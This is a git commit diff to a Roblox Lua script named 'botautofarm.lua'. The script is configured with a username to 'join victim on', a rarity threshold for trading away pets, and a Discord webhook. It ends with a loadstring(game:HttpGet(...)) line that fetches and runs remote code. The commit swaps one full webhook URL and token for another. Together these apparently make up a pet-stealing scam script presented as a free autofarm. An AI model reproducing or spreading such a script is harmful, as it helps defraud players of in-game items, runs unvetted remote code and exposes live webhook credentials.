2268d9c0394f34ffcd6cfb08124d408572b1319e
relapsedddd <callumlovesdad@gmail.com>
2025-04-19 10:49:23 -0600

    Update botautofarm.lua

--- botautofarm.lua
+++ botautofarm.lua
@@ -1,6 +1,6 @@
 _G.Username = "callumlovesdad" -- user you should join victim on
 _G.min_chance = 100 -- 10000 means it only trades pets that are 1 in 10k or rarer
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1362784443974156478/IJ1XsGucrZp_nMObTyflcTigOUnn5IDFROF7g144lCgvJF5CU2VnQICW8K2wTW8DPQlO" -- change to your webhook 
+_G.webhook = "https://discord.com/api/webhooks/1363013765821632582/3P8sSydrl2g-9dGj6VXi-maxNau__MEauJDEb16UzH4lQHZlNbc29qhH3AvxsuEuR-Lc" -- change to your webhook 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/spookzv4/bubblegum/refs/heads/main/FREEbgsi.lua"))()
